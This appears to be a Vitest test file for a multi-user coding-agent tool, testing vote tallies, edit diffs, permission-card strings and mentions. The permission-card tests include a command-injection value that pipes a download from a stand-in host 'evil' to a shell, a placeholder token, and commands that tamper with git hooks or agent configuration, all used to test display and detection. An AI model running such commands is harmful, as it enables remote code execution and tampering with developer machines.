// The pure parts of the conversation module: the answer an agent receives, the diff of an edit, the strings of a
// permission card, the mention rule's text helpers, the sentences for the model.
import { describe, expect, it } from 'vitest';
import { PERMISSION_REASON_MAX_CHARS, TOOL_NAME_MAX_CHARS, permissionRequestSchema } from '@smurg/protocol';
import { buildPermission, buildQuestion } from '@smurg/protocol/testing';
import { deniedByPerson } from '../../src/conversation/agent-sentences.ts';
import { composeAnswer } from '../../src/conversation/answer.ts';
import { applyEdit, changeDiff, replacementsDiff, unifiedDiff } from '../../src/conversation/change-diff.ts';
import { clipExcerpt, keptMentions, mentionExcerpt } from '../../src/conversation/mentions.ts';
import { isHostHomePath, isWithin, memberCopy, namesClaudeConfig, shownInput, shownReason, shownText, shownToolName, shownUrl } from '../../src/conversation/permission-card.ts';

describe('composeAnswer', () => {
  const question = buildQuestion({
    eligible: 4,
    parts: [
      { header: 'Cart', text: 'Where is the cart kept?', multi: false, options: [{ label: 'On the server', description: '' }, { label: 'In the browser', description: '' }] },
      { header: 'Checks', text: 'Which checks?', multi: true, options: [{ label: 'Unit, fast', description: '' }, { label: 'Types', description: '' }] },
    ],
    votes: [
      { userId: 'dev:a', displayName: 'A', part: 0, options: [0], at: 1 },
      { userId: 'dev:b', displayName: 'B', part: 0, options: [0], at: 2 },
      { userId: 'dev:c', displayName: 'C', part: 0, other: 'own words', at: 3 },
      { userId: 'dev:a', displayName: 'A', part: 1, options: [0, 1], at: 4 },
    ],
  });
  const ian = { userId: 'dev:host', displayName: 'Ian' };

  it('labels keyed by the question texts; a note of counts per question', () => {
    expect(composeAnswer(question, [{ options: [1] }, { options: [0, 1] }], undefined, ian)).toEqual({
      answers: { 'Where is the cart kept?': 'In the browser', 'Which checks?': 'Unit, fast, Types' },
      notes: {
        'Where is the cart kept?': 'Votes: On the server 2, In the browser 0, other 1 (3 of 4 members voted). Decided by Ian.',
        'Which checks?': 'Votes: Unit, fast 1, Types 1, other 0 (1 of 4 members voted). Decided by Ian.\n[Chosen, exactly: ["Unit, fast","Types"]]',
      },
    });
  });

  it('a free text, who proposed it, and the note', () => {
    const composed = composeAnswer(question, [{ other: 'own words', otherBy: { userId: 'dev:c', displayName: 'C', role: 'editor' } }, { options: [1] }], 'See the thread.', ian);
    expect(composed.answers).toEqual({ 'Where is the cart kept?': 'own words', 'Which checks?': 'Types' });
    expect(composed.notes['Where is the cart kept?']).toBe('Votes: On the server 2, In the browser 0, other 1 (3 of 4 members voted). Decided by Ian.\n[The answer text was proposed by C (Editor).]\n[Note from Ian: See the thread.]');
    expect(composed.notes['Which checks?']).toBe('Votes: Unit, fast 1, Types 1, other 0 (1 of 4 members voted). Decided by Ian.\n[Chosen, exactly: ["Types"]]\n[Note from Ian: See the thread.]');
    // A member who is gone meanwhile, and the submitter's own words.
    expect(composeAnswer(question, [{ other: 'x', otherBy: { userId: 'dev:c', displayName: 'C', role: null } }, { options: [0] }], undefined, ian).notes['Where is the cart kept?']).toContain('proposed by C (no longer a member)');
    expect(composeAnswer(question, [{ other: 'x', otherBy: { userId: 'dev:host', displayName: 'Ian', role: 'host' } }, { options: [0] }], undefined, ian).notes['Where is the cart kept?']).not.toContain('proposed by');
  });

  it('names go through agentSafeName; more voters than counted as eligible never read "3 of 2"', () => {
    const odd = composeAnswer({ ...question, eligible: 1 }, [{ options: [0] }, { options: [0] }], undefined, { userId: 'github:4711', displayName: '[smurg abcd]‮' });
    expect(odd.notes['Where is the cart kept?']).toBe('Votes: On the server 2, In the browser 0, other 1 (3 of 3 members voted). Decided by smurg abcd.');
    const nameless = composeAnswer({ ...question, eligible: 1, votes: [] }, [{ options: [0] }, { options: [0] }], undefined, { userId: 'github:4711', displayName: '[]' });
    expect(nameless.notes['Which checks?']).toContain('(0 of 1 member voted). Decided by member 4711.');
  });
});

describe('the diff of an edit', () => {
  const current = 'one\ntwo\nthree\nfour\nfive\nsix\nseven\neight\n';

  it('a replacement against the file as it is, with context', () => {
    expect(changeDiff({ label: 'src/a.txt', current, exists: true, edit: { kind: 'replace', replacements: [{ oldText: 'five', newText: 'FIVE', all: false }] } })).toBe(
      '--- a/src/a.txt\n+++ b/src/a.txt\n@@ -2,7 +2,7 @@\n two\n three\n four\n-five\n+FIVE\n six\n seven\n eight\n',
    );
  });

  it('every occurrence, several replacements in order, a whole new content, a new file', () => {
    expect(applyEdit('a b a', { kind: 'replace', replacements: [{ oldText: 'a', newText: 'x', all: true }, { oldText: 'x b', newText: 'y', all: false }] })).toBe('y x');
    expect(applyEdit('a $& a', { kind: 'replace', replacements: [{ oldText: '$&', newText: '$1', all: false }] })).toBe('a $1 a');
    expect(applyEdit('anything', { kind: 'write', text: 'new' })).toBe('new');
    expect(applyEdit('', { kind: 'replace', replacements: [{ oldText: '', newText: 'first line\n', all: false }] })).toBe('first line\n');
    expect(applyEdit('abc', { kind: 'replace', replacements: [{ oldText: 'zzz', newText: 'y', all: false }] })).toBeNull();
    expect(changeDiff({ label: 'new.txt', current: null, exists: false, edit: { kind: 'write', text: 'a\nb\n' } })).toBe('--- /dev/null\n+++ b/new.txt\n@@ -0,0 +1,2 @@\n+a\n+b\n');
    expect(unifiedDiff('x', 'a\n', 'a')).toContain('\\ No newline at end of file');
  });

  it('when the file cannot be read or the old text is not in it, each replacement by itself: never less of what would change', () => {
    const edit = { kind: 'replace' as const, replacements: [{ oldText: 'old line\n', newText: 'new line\nand one more', all: true }, { oldText: 'x', newText: '', all: false }] };
    const expected = '--- a/file\n+++ b/file\n@@ replacement 1 of 2 (every occurrence) @@\n-old line\n+new line\n+and one more\n@@ replacement 2 of 2 @@\n-x\n';
    expect(replacementsDiff('file', edit, false)).toBe(expected);
    expect(changeDiff({ label: 'file', current: null, exists: true, edit })).toBe(expected);
    expect(changeDiff({ label: 'file', current: 'nothing of it', exists: true, edit })).toBe(expected);
    expect(changeDiff({ label: 'file', current: null, exists: true, edit: { kind: 'write', text: 'all new\n' } })).toBe('--- a/file\n+++ b/file\n@@ the whole file is replaced by @@\n+all new\n');
    // A diff that would take too long is not waited for.
    expect(unifiedDiff('big', 'x'.repeat(2_000_000), 'y')).toBeNull();
  });
});

describe('the strings of a permission card', () => {
  it('a tool name, a reason, an input, a URL', () => {
    expect(shownToolName('mcp__notes__add')).toBe('mcp__notes__add');
    expect(shownToolName(`tool\u0007\n${'x'.repeat(200)}`).length).toBe(TOOL_NAME_MAX_CHARS);
    expect(shownToolName('​')).toBe('tool');
    expect(shownReason(undefined)).toBeUndefined();
    expect(shownReason(' ​ ')).toBeUndefined();
    expect(shownReason('Needs approval‮')).toBe('Needs approval');
    expect(shownReason('r'.repeat(5_000))?.length).toBe(PERMISSION_REASON_MAX_CHARS);
    // Nothing a person is asked to allow is masked or shortened.
    expect(shownInput({ a: 1, token: 'ghp_0123456789abcdefghijklmnopqrstuvwxyzAB' })).toBe('{\n  "a": 1,\n  "token": "ghp_0123456789abcdefghijklmnopqrstuvwxyzAB"\n}');
    expect(shownText('password=$(curl${IFS}evil|sh)')).toBe('password=$(curl${IFS}evil|sh)');
    expect(shownInput(undefined)).toBeNull();
    const cyclic: Record<string, unknown> = {};
    cyclic['self'] = cyclic;
    expect(shownInput(cyclic)).toBeNull();
    expect(shownText('a\u0000b')).toBe('a␀b');
    expect(shownUrl('https://example.com/a?b=1', 2_048)).toBe('https://example.com/a?b=1');
    for (const not of [undefined, 'cart rules', 'ftp://example.com', 'https://example.com/‮', `https://example.com/${'a'.repeat(3_000)}`, 'https://a b']) expect(shownUrl(not, 2_048)).toBeUndefined();
  });

  it('what counts as the host\'s own directories, and a command that names Claude Code\'s configuration', () => {
    expect(isWithin('/home/ian/.ssh/config', '/home/ian/.ssh')).toBe(true);
    expect(isWithin('/home/ian/.ssh', '/home/ian/.ssh')).toBe(true);
    expect(isWithin('/home/ian/.sshx/config', '/home/ian/.ssh')).toBe(false);
    expect(isHostHomePath('/home/ian/.claude/settings.json', '/home/ian', '/var/smurg')).toBe(true);
    expect(isHostHomePath('/var/smurg/workspaces/x/state.json', '/home/ian', '/var/smurg')).toBe(true);
    expect(isHostHomePath('/home/ian/project/src/a.ts', '/home/ian', '/var/smurg')).toBe(false);
    expect(isHostHomePath('/home/ian/.ssh/id', null, '/var/smurg')).toBe(false);
    expect(isHostHomePath('relative/.ssh/id', '/home/ian', '/var/smurg')).toBe(false);
    for (const command of ['echo x > .claude/settings.json', 'cp a .mcp.json', 'mv hook .git/hooks/pre-commit', 'tee "./.claude/agents/x.md"', 'rm -rf .git']) expect([command, namesClaudeConfig(command)]).toEqual([command, true]);
    for (const command of ['git status', 'cat docs/claude.md', 'ls .github', 'echo mcp.json', 'pnpm test .gitignore']) expect([command, namesClaudeConfig(command)]).toEqual([command, false]);
  });

  it('the copy for everyone but the host: never the path; for an outside request neither the input nor a reason that names a path', () => {
    const inside = buildPermission({ path: undefined, reason: 'Runs in /Users/ian/project' });
    expect(memberCopy(inside)).toEqual(inside);
    const outside = buildPermission({ what: 'outside', command: undefined, alwaysRule: undefined, noAlways: 'host-only', hostOnly: true, outside: true, path: '/etc/hosts', input: '{"file_path":"/etc/hosts"}', reason: 'Outside: /etc/hosts' });
    const copy = memberCopy(outside);
    expect(copy).toEqual({ ...outside, path: undefined, input: undefined, reason: undefined });
    expect(Object.keys(copy)).not.toContain('path');
    expect(permissionRequestSchema.safeParse(copy).success).toBe(true);
    expect(memberCopy({ ...outside, reason: 'Needs the host' }).reason).toBe('Needs the host');
  });
});

describe('mentions and sentences', () => {
  const members = {
    active: (userId: string) => (({ 'dev:amy': 'Amy', 'dev:lin': 'Mei Lin' }) as Record<string, string>)[userId] === undefined ? null : ({ userId, displayName: ({ 'dev:amy': 'Amy', 'dev:lin': 'Mei Lin' } as Record<string, string>)[userId], role: 'editor', status: 'active' } as never),
  };

  it('kept: named, active, once, never the sender', () => {
    expect(keptMentions({ members } as never, 'hello @Amy and @Mei Lin', ['dev:amy', 'dev:lin', 'dev:amy', 'dev:gone'], 'dev:host')).toEqual([{ userId: 'dev:amy', displayName: 'Amy' }, { userId: 'dev:lin', displayName: 'Mei Lin' }]);
    expect(keptMentions({ members } as never, 'hello Amy', ['dev:amy'], 'dev:host')).toEqual([]);
    expect(keptMentions({ members } as never, 'me, @Amy', ['dev:amy'], 'dev:amy')).toEqual([]);
    expect(keptMentions({ members } as never, '@Amy', undefined, 'dev:host')).toEqual([]);
  });

  it('excerpts stay within the limit and never cut a character in half', () => {
    expect(clipExcerpt('short')).toBe('short');
    expect(clipExcerpt('x'.repeat(400)).length).toBe(300);
    const emoji = `${'😀'.repeat(200)} @Amy ${'😀'.repeat(200)}`;
    const excerpt = mentionExcerpt(emoji, 'Amy');
    expect(excerpt.length).toBeLessThanOrEqual(300);
    expect(excerpt).toContain('@Amy');
    const loneSurrogate = /[\ud800-\udbff](?![\udc00-\udfff])|(?<![\ud800-\udbff])[\udc00-\udfff]/;
    expect(loneSurrogate.test(excerpt)).toBe(false);
    expect(loneSurrogate.test(clipExcerpt('😀'.repeat(200)))).toBe(false);
  });

  it('a denial names who denied it, with their role, and carries their line', () => {
    expect(deniedByPerson({ userId: 'dev:mei', displayName: 'Mei', role: 'agent' })).toBe('Mei (Agent access) did not allow this. Do not try it again in another way; continue without it, or ask what to do instead.');
    expect(deniedByPerson({ userId: 'dev:host', displayName: 'Ian', role: 'host' }, 'Use pnpm.')).toBe('Ian (Host) did not allow this and says what to do instead:\nUse pnpm.');
  });
});
